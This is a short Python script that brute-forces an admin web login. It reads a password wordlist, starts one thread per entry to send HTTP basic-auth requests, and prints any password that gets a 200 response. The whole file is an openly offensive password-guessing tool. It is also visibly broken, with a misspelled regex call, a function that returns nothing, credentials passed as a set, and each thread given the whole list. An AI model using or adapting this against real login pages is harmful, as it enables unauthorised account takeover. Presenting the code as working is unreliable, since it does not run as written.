import requests
import os
import re
import threading


print("""

		Enter the URL of the admin webpage below

	""")
url = input()
print("""

		Enter the path to your wordlist

	""")
wordpasspath = input()
print("""

		Enter the admin login

	""")
admin = input()

def open_passwords(path):
	wordpasspath = os.path.abspath(path)
	p = list()
	with open(wordpasspath, 'r') as wordlist:
		for i in wordlist:
			i = re.math('\w+', i)
			p.append(i[0])


def brutePasswords(password, url, login):
	r = requests.Session()
	r = r.get(url, auth={login, password})
	if r.status == 200:
		print(password)


passw = open_passwords(wordpasspath)
for i in range(len(passw)):
	t = threading.Thread(target=brutePasswords, args=(passw, url, admin))
	t.start()
